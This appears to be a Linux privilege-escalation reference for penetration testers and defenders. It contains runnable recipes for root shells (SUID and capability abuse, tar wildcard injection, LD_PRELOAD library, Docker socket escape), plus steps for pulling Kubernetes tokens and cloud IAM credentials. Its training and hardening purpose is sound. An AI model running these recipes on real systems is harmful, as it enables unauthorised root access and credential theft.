## 1. Overview

Linux is the dominant server OS and the foundation of most container
and cloud infrastructure. Its security model is built on a small number
of primitives that every offensive and defensive practitioner must
understand: Unix permissions, ownership, SUID/SGID bits, capabilities,
namespaces, cgroups, and systemd.

**Core concepts:**

- **Users and groups** - UID (user ID) and GID (group ID). `root` is
  UID 0. System accounts (UID < 1000) are service accounts.
- **File permissions** - read (r), write (w), execute (x) for owner,
  group, and others. Represented as octal (e.g. `0755`).
- **Ownership** - each file has a user owner and a group owner.
- **SUID / SGID bits** - when set on an executable, the process runs
  with the file owner's (SUID) or group's (SGID) privileges.
- **Sticky bit** - on a directory, only the owner can delete or rename
  their own files (e.g. `/tmp`).
- **Capabilities** - fine-grained privileges that can be granted to
  binaries (e.g. `cap_net_raw`, `cap_setuid`).
- **Namespaces** - kernel-level isolation (PID, network, mount, user,
  UTS, IPC, cgroup) - the foundation of containers.
- **cgroups** - resource limits (CPU, memory, I/O) - the other half of
  containers.
- **systemd** - the modern init system; manages services, sockets,
  timers, mounts.

**Directory structure:**

- `/etc` - configuration (passwd, shadow, sudoers, ssh).
- `/var` - variable data (logs, spool, www, lib).
- `/tmp` - world-writable, cleaned on reboot (usually).
- `/home` - user home directories.
- `/root` - root's home.
- `/opt`, `/srv` - optional and service data.
- `/usr/local` - locally installed software.
- `/proc`, `/sys` - kernel interfaces.

**Key files:**

- `/etc/passwd` - user accounts (UID, GID, home, shell).
- `/etc/shadow` - password hashes (root-readable only).
- `/etc/group` - group definitions.
- `/etc/sudoers` - sudo rules (edit with `visudo`).
- `/etc/crontab`, `/etc/cron.*/`, `/var/spool/cron/` - cron jobs.
- `~/.ssh/` - SSH keys and config.
- `/etc/systemd/system/`, `/lib/systemd/system/` - systemd units.

## 2. Reconnaissance / Enumeration

**Offensive - system info:**

    # OS and kernel
    uname -a
    cat /etc/os-release
    cat /proc/version

    # Architecture
    arch
    dpkg --print-architecture 2>/dev/null || rpm -q --qf '%{ARCH}\n' kernel

    # Uptime and load
    uptime

    # Environment
    env
    set

**Offensive - users and groups:**

    # Current user
    id
    whoami
    groups

    # All users
    cat /etc/passwd
    cat /etc/passwd | grep -v nologin | grep -v false

    # Users with shells
    grep -E "sh$" /etc/passwd

    # Group memberships
    cat /etc/group

    # Sudoers
    sudo -l
    cat /etc/sudoers 2>/dev/null

**Offensive - permissions:**

    # SUID binaries
    find / -perm -4000 -type f 2>/dev/null

    # SGID binaries
    find / -perm -2000 -type f 2>/dev/null

    # Writable files (owned by current user or group)
    find / -writable -type f 2>/dev/null | grep -v proc
    find / -writable -type d 2>/dev/null | grep -v proc

    # Files with capabilities
    getcap -r / 2>/dev/null

    # World-writable files
    find / -perm -0002 -type f 2>/dev/null | grep -v proc

    # World-writable directories (sticky bit not set)
    find / -perm -0002 -type d ! -perm -1000 2>/dev/null | grep -v proc

**Offensive - processes:**

    # All processes with full command lines
    ps auxww
    ps -ef

    # Process tree
    pstree -p

    # Listening ports
    ss -tulnp
    netstat -tulnp

    # Running as root
    ps aux | grep "^root"

**Offensive - cron:**

    # System cron
    cat /etc/crontab
    ls -la /etc/cron.*
    cat /etc/cron.d/*

    # User cron
    crontab -l
    ls -la /var/spool/cron/crontabs/
    cat /var/spool/cron/crontabs/*

    # Systemd timers
    systemctl list-timers --all

**Offensive - services:**

    # All services
    systemctl list-units --type=service

    # Enabled services
    systemctl list-unit-files --type=service --state=enabled

    # Service files (look for writable ones)
    ls -la /etc/systemd/system/
    ls -la /lib/systemd/system/
    systemctl cat <service>

**Offensive - network:**

    # Interfaces
    ip a
    ifconfig

    # Routes
    ip route
    route -n

    # ARP
    ip neigh
    arp -a

    # DNS
    cat /etc/resolv.conf
    cat /etc/hosts

**Offensive - installed software:**

    # Package managers
    dpkg -l 2>/dev/null
    rpm -qa 2>/dev/null
    apk info 2>/dev/null

    # Common vulnerable packages
    dpkg -l | grep -iE "sudo|polkit|pkexec|glibc|openssh"

    # Running services with versions
    ss -tulnp

**Defensive - what to baseline:**

- SUID/SGID binaries (compare against distribution default).
- Files with capabilities.
- Cron jobs and systemd timers.
- Running processes and their parents.
- Listening ports.
- Local user accounts and group memberships.
- Sudoers rules.

## 3. Common Attack Vectors

**Permission misconfigurations:**

- **SUID binary abuse** - a SUID binary that can be exploited (e.g.
  `find`, `nmap`, `vim`, `bash`) yields the owner's privileges.
- **SGID binary abuse** - same, but with group privileges.
- **Writable system files** - a script or config used by a root
  process that is writable by a lower-privileged user.
- **Writable system directories** - a directory in `PATH` used by a
  root process, allowing binary planting.
- **Capabilities abuse** - a binary with `cap_setuid` or
  `cap_dac_read_search` can yield root or read-protected files.

**Service misconfigurations:**

- **Weak systemd unit** - a unit with a writable `ExecStart` or
  `EnvironmentFile`.
- **Writable service binary** - the service's executable is writable by
  a low-privileged user.
- **PATH hijacking** - a service script calls a binary by name; if the
  PATH contains a writable directory, plant a fake binary.

**Cron and timers:**

- **Writable cron script** - a script run by root cron is writable.
- **Wildcard injection** - a cron job runs `tar` or similar with a
  wildcard; plant files with crafted names (e.g. `--checkpoint=1`).
- **Writable cron directory** - a directory in the cron path is
  writable.

**Sudo:**

- **`sudo -l` misconfiguration** - a user can run a specific binary
  with sudo; abuse it via GTFOBins.
- **`LD_PRELOAD`** - allowed via sudo (rare, but powerful).
- **`env_keep` variables** - preserved env vars that can be abused.
- **Sudo version vulnerabilities** - e.g. Baron Samedit
  (CVE-2021-3156).

**PATH and environment:**

- **PATH hijacking** - a root process calls a binary by name; PATH
  includes a writable directory.
- **`LD_PRELOAD`** - if allowed, preload a malicious library.
- **`LD_LIBRARY_PATH`** - same, for libraries.

**Kernel:**

- **Unpatched kernel CVE** - e.g. Dirty Pipe (CVE-2022-0847),
  PwnKit (CVE-2021-4034, polkit).
- **Vulnerable driver** - less common on Linux than Windows.

**Credentials:**

- **SSH private keys** - in `~/.ssh/` or elsewhere.
- **`.bash_history`** - commands with credentials.
- **Config files** - `wp-config.php`, `.env`, `credentials`.
- **Environment variables** - API keys, tokens.
- **Cloud metadata** - `169.254.169.254` for AWS/GCP/Azure IAM.

**Containers:**

- **Docker socket** - `/var/run/docker.sock` mounted inside a
  container; access = host root.
- **Privileged container** - full capabilities; escape via `nsenter`
  or mount.
- **Host mount** - a host directory mounted inside the container; write
  to it to affect the host.
- **Kubernetes service account token** - `/var/run/secrets/
  kubernetes.io/serviceaccount/token`; abuse Kubernetes API.

## 4. Exploitation Recipes

**SUID binary abuse (GTFOBins pattern):**

    # 1. Find SUID binaries
    find / -perm -4000 -type f 2>/dev/null

    # 2. Check each against GTFOBins (https://gtfobins.github.io/)
    # Example: /usr/bin/find with SUID
    find . -exec /bin/sh -p \; -quit

    # Expected output: root shell
    # # whoami
    # root

**SUID bash:**

    # If /bin/bash has SUID
    /bin/bash -p

    # Expected output: root shell

**Capabilities abuse:**

    # 1. Find binaries with capabilities
    getcap -r / 2>/dev/null

    # Example: /usr/bin/python3.9 = cap_setuid+ep
    # 2. Exploit: Python can setuid(0) and spawn a shell
    python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'

    # Expected output: root shell

**Sudo misconfiguration:**

    # 1. Check sudo rules
    sudo -l

    # Example output:
    # User www-data may run the following commands on host:
    #     (root) NOPASSWD: /usr/bin/find

    # 2. Abuse via GTFOBins
    sudo find . -exec /bin/sh \; -quit

    # Expected output: root shell

**Cron wildcard injection (tar):**

    # 1. Check for a cron job running tar with a wildcard in a
    #    writable directory
    cat /etc/crontab
    # Example: */5 * * * * root cd /home/user && tar czf /tmp/backup.tar.gz *

    # 2. Plant files with crafted names in the directory
    cd /home/user
    echo "" > "--checkpoint-action=exec=sh shell.sh"
    echo "" > "--checkpoint=1"
    cat > shell.sh <<'EOF'
    #!/bin/bash
    cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
    EOF
    chmod +x shell.sh

    # 3. Wait for cron to run, then exploit
    /tmp/rootbash -p
    # Expected output: root shell

**PATH hijacking:**

    # 1. Find a service/cron script that calls a binary by name
    #    without an absolute path
    cat /etc/crontab
    # Example: */5 * * * * root cd /home/user && ./script.sh
    # script.sh contains: tar czf /tmp/backup.tar.gz /var/www

    # 2. If the script's PATH includes a writable directory
    #    (or the script calls `tar` without a full path and the
    #    current directory is in PATH), plant a fake binary
    echo '#!/bin/bash' > /home/user/tar
    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/tar
    chmod +x /home/user/tar

    # 3. Wait for cron, then exploit
    /tmp/rootbash -p

**Sudo LD_PRELOAD:**

    # 1. Check if sudoers has env_keep+=LD_PRELOAD
    sudo -l
    # Example output includes: env_keep+=LD_PRELOAD

    # 2. Create a malicious shared library
    cat > /tmp/exploit.c <<'EOF'
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }
    EOF
    gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles

    # 3. Run any sudo command with LD_PRELOAD set
    sudo LD_PRELOAD=/tmp/exploit.so <any-allowed-command>

    # Expected output: root shell

**PwnKit (CVE-2021-4034) - polkit pkexec:**

    # 1. Check pkexec version
    pkexec --version

    # 2. If vulnerable, use the public exploit
    # (e.g. https://github.com/berdav/CVE-2021-4034)
    gcc cve-2021-4034-poc.c -o cve-2021-4034
    ./cve-2021-4034

    # Expected output: root shell

**Docker socket escape:**

    # 1. Check if /var/run/docker.sock is mounted inside the container
    ls -la /var/run/docker.sock

    # 2. If present, use it to start a privileged container with
    #    the host root filesystem mounted
    docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

    # Expected output: root shell on the host

**Kubernetes service account token:**

    # 1. Check for the token
    ls -la /var/run/secrets/kubernetes.io/serviceaccount/
    cat /var/run/secrets/kubernetes.io/serviceaccount/token

    # 2. Query the API
    APISERVER=https://kubernetes.default.svc
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    curl -s $APISERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --insecure

**Cloud metadata service:**

    # AWS/GCP/Azure IMDS
    curl http://169.254.169.254/latest/meta-data/
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

    # Expected output: IAM role name; then fetch credentials
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

## 5. Post-Exploitation

**On a compromised Linux host:**

- Dump credentials from `/etc/shadow` (requires root).
- Search for SSH keys in `~/.ssh/` and elsewhere.
- Search for credentials in config files, `.bash_history`, `.env`.
- Dump process memory for credentials (`gcore`, `memdump`).
- Enumerate mounted filesystems and network shares.
- Enumerate SUID/SGID binaries and capabilities again as root
  (some become usable with new privileges).
- Search for cloud credentials in metadata service.
- Enumerate containers and Kubernetes tokens.

**Persistence on a host:**

- Cron jobs (user-level and system-level).
- Systemd services and timers.
- SSH authorized keys.
- PAM modules.
- Shell profile files (`.bashrc`, `.profile`).
- LD_PRELOAD in `/etc/ld.so.preload`.
- Kernel modules.

**Lateral movement from a host:**

- SSH keys and known hosts.
- SSH agent forwarding.
- NFS shares.
- Samba / SMB shares.
- Kerberos tickets (on domain-joined Linux).
- Cloud IAM roles.

## 6. Risk Context

Linux hosts are the backbone of enterprise infrastructure. A single
compromised host often yields:

- Credentials for other hosts (SSH keys, passwords).
- Access to shared data (NFS, SMB).
- A pivot into the internal network.
- Cloud IAM roles (via metadata service).
- Container and Kubernetes access.

**Blast radius:** a compromised Linux server with SSH keys often
unlocks dozens of other servers. A compromised Kubernetes node often
unlocks the entire cluster.

**Why attacks succeed:**

- SUID/SGID binaries are common (some are exploitable).
- Capabilities are often granted to binaries that do not need them.
- Cron jobs frequently run scripts in writable directories.
- sudoers rules are often too permissive.
- Credentials in plaintext in config files.
- Unpatched kernels.
- Containers with overly permissive mounts.

## 7. Root Causes

- **Over-privileged SUID/SGID binaries.** Legacy or third-party
  binaries with SUID bit.
- **Capabilities granted broadly.** e.g. `cap_setuid` on Python.
- **Writable cron scripts.** Scripts in user-writable directories run
  by root cron.
- **PATH misconfigurations.** Scripts call binaries by name without
  absolute paths.
- **Weak sudoers rules.** Specific commands without argument
  restrictions.
- **Credentials in files.** Config files, history, environment.
- **Unpatched kernels.** Kernel CVEs are exploited in minutes.
- **Container misconfigurations.** Docker socket, privileged
  containers, host mounts.

## 8. Preventive Controls

**Permission hardening:**

- Audit SUID/SGID binaries against a baseline.
- Remove SUID from binaries that do not need it.
- Restrict file capabilities to the minimum required.
- Restrict write access to system directories.

**Service hardening:**

- Use systemd hardening options (`NoNewPrivileges=yes`,
  `ProtectSystem=strict`, `PrivateTmp=yes`).
- Avoid running services as root when not necessary.
- Restrict service binary and unit file permissions.

**Cron hardening:**

- Restrict cron job scripts to root-owned directories.
- Avoid wildcards in cron commands.
- Use absolute paths in scripts.

**Sudo hardening:**

- Use specific command paths, not wildcards.
- Restrict arguments with `sudoers` (e.g. `Cmnd_Alias`,
  `Defaults secure_path`).
- Do not use `env_keep+=LD_PRELOAD` unless strictly needed.
- Patch sudo regularly.

**Credential hygiene:**

- Do not store plaintext credentials in config files.
- Use SSH keys with passphrases; restrict key permissions (`0600`).
- Rotate keys and passwords regularly.
- Remove `.bash_history` before deployment.

**Kernel and packages:**

- Patch kernel and packages within days.
- Enable automatic security updates.
- Remove unnecessary packages.

**Containers:**

- Do not mount the Docker socket inside containers.
- Do not run privileged containers.
- Use read-only mounts where possible.
- Use user namespaces to isolate.

**Monitoring:**

- Enable auditd.
- Forward logs to a SIEM.
- Baseline and alert on SUID/SGID changes, capability changes,
  cron/scheduled task changes, SSH key changes.

## 9. Detection Controls

**SUID/SGID changes:**

- auditd rule: `-a always,exit -F arch=b64 -S chmod -S fchmod
  -S fchmodat -F auid>=1000 -F auid!=unset -k perm_mod`
- AIDE / Tripwire for file integrity.
- Alert on new SUID binaries.

**Capabilities changes:**

- `getcap -r /` as baseline.
- Alert on `setcap` usage (auditd rule for `setxattr`).

**Cron / systemd timers:**

- auditd rule on `/etc/cron*`, `/var/spool/cron`, `/etc/systemd/`.
- Sysmon for Linux (if available) - process creation, file create.

**sudo abuse:**

- auditd rule on `/usr/bin/sudo` with full command logging.
- `/var/log/auth.log` (Debian) or `/var/log/secure` (RHEL) for sudo
  events.
- Alert on unusual sudo commands.

**SSH abuse:**

- `/var/log/auth.log` for SSH logins.
- Alert on login with keys not in the baseline.
- Alert on authorized_keys modifications.

**Container escapes:**

- auditd on `/var/run/docker.sock` access.
- Alert on `docker run --privileged`.
- Kubernetes audit log for pod creation with host mounts.

**Kernel exploits:**

- Alert on crash dumps (`/var/crash`).
- Monitor for unexpected kernel module loads.

**General:**

- AIDE / Tripwire for file integrity.
- OSSEC / Wazuh for HIDS.
- Sysmon for Linux.
- Falco for container runtime security.

## 10. Verification

**Offensive - did the attack succeed?**

- SUID abuse: shell with effective UID 0 (`id` shows `uid=0`).
- Capabilities: shell with root privileges.
- Sudo: command runs as root; verify with `id`.
- Cron injection: payload runs and creates a SUID shell or reverse
  shell.
- Docker socket escape: command runs on the host; verify with
  `hostname` and `id`.

**Defensive - are controls effective?**

- Test SUID abuse: baseline includes only expected SUID binaries.
- Test capabilities: baseline includes only expected capabilities.
- Test cron: cron scripts are root-owned and not writable.
- Test sudo: rules are specific and argument-restricted.
- Test container: Docker socket not mounted; no privileged containers.
- Test patching: kernel and packages are current within 30 days.
- Test auditd: rules are loaded and events are forwarded to SIEM.

## 11. OSCP Notes

- Linux privesc is a common OSCP requirement. Practice:
  - `id`, `sudo -l`, `find / -perm -4000 -type f 2>/dev/null`.
  - `getcap -r / 2>/dev/null`.
  - `cat /etc/crontab`, `crontab -l`.
  - `uname -a` for kernel version.
  - linPEAS, LinEnum, pspy.
- **Capture screenshots** of:
  - `id` showing the current user.
  - The misconfiguration (SUID binary, sudo rule, cron job).
  - The exploitation command and the resulting root shell.
  - `id` showing `uid=0(root)`.
- The `> [!IMPORTANT]` OSCP reporting note applies to the privesc step.

## 12. Production Notes

- Linux privesc vectors in production are usually the same as in the
  lab, but EDR/HIDS blocks the noisy tools (linPEAS, Mimipenguin).
- In mature environments, focus on credential theft from files and
  environment variables.
- SUID binaries are rare in hardened production environments; audit
  regularly.
- Container escapes are the modern high-value target; audit Docker
  socket mounts and privileged containers.
- Cloud metadata services are a primary target on cloud-hosted Linux;
  restrict IMDSv2 and least-privilege IAM roles.
- Assume HIDS is present; plan for speed and silence.

## 13. References

**Linux documentation:**

- [Linux man pages](https://man7.org/linux/man-pages/)
- [systemd documentation](https://www.freedesktop.org/software/systemd/man/)
- [Linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)

**MITRE ATT&CK:**

- [Privilege Escalation - Exploitation for Privilege Escalation (T1068)](https://attack.mitre.org/techniques/T1068/)
- [Privilege Escalation - Abuse Elevation Control Mechanism (T1548)](https://attack.mitre.org/techniques/T1548/)
- [Persistence - Scheduled Task/Job: Cron (T1053.003)](https://attack.mitre.org/techniques/T1053/003/)
- [Persistence - Create or Modify System Process: Systemd Service (T1543.002)](https://attack.mitre.org/techniques/T1543/002/)

**Tools:**

- [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [pspy](https://github.com/DominicBreuker/pspy)
- [GTFOBins](https://gtfobins.github.io/)
- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

**Research:**

- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [GTFOBins](https://gtfobins.github.io/)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)